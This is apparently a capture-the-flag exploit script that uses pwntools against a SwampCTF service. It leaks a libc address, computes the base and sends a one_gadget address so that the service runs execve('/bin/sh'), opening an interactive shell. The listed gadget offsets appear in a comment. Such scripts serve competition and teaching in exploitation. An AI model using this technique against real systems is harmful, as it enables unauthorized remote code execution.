#!/usr/bin/env python2

# Basic "magic gadget" challenge
# https://github.com/david942j/one_gadget
'''
[~/CTF/swamp]$ one_gadget libc.so.6 
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
from pwn import *
context.log_level = 'DEBUG'
# magic gadget = 0xf02a4 or 0xf1147 or 0x45216
# sys = 0x45390

#r = process("./power")
r = remote("chal1.swampctf.com", 1999)
r.sendline("yes")
r.recvuntil("you ")
r.recvuntil("you ")
sys_addr = int(r.recvuntil("]")[:-1], 16)
libc_base = sys_addr - 0x45390
log.info("libc base: " + hex(libc_base))
magic = libc_base + 0xf1147

r.recvuntil(": ")
r.send(p64(magic))
r.interactive()

